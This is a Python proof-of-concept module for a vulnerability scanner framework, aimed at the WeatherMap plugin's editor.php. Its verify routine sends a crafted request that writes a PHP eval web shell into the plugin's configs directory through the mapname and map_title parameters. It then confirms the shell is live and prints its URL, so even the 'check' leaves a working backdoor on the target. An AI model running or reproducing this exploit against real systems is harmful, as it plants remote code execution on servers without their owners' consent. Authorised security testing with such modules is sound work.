# coding:utf-8
import argparse
import time
import traceback

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WeaTherMap_0101'  # 平台漏洞编号
    name = 'WeaTherMap插件的editor.php利用参数mapname上传一句话shell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
    WeaTherMap插件的editor.php利用参数mapname上传一句话shell。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WeaTherMap'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f8eaa881-8da0-4368-8fbf-f2329c652ae2'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def check_my_shell(self, shell_url):
        # md5(666) = fae0b27c451c728867a567e8c1bb4e53
        s = requests.session()
        res = s.get(shell_url)
        if "fae0b27c451c728867a567e8c1bb4e53" in res.text:
            return True
        else:
            return False

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target
            shell_text = "Gif89a <?php @eval($_POST['wooyun']);?>"
            file = None
            try:
                if not (file is None):
                    shellfile = open(file, 'rb')
                    shell_text = shellfile.read()
                    shellfile.close()
            except Exception as e:
                self.output.info("File Not Found.")
                return
            temp_url = "{target_url}/plugins/weathermap/editor.php?plug=0&mapname={shell_name}&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=<?php echo md5(666);?>{shell_content}&map_legend=Traffic+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7&map_linkdefaultbwin=100M&map_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&map_htmlfile=&map_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=overlib&mapstyle_arrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyle_legendfont=4&item_configtext=NameH"
            timetemp = time.time()
            tmp_file_name = str(int(timetemp))+".php"
            s = requests.session()
            res = s.get(temp_url.format(target_url=url,
                                        shell_name=tmp_file_name, shell_content=shell_text))
            if res.status_code == 200:
                check_shell = url + \
                    "/plugins/weathermap/configs/{shell_name}".format(
                        shell_name=tmp_file_name)
                flag = self.check_my_shell(check_shell)
                if flag:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                    print(("SHELL: " + check_shell))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
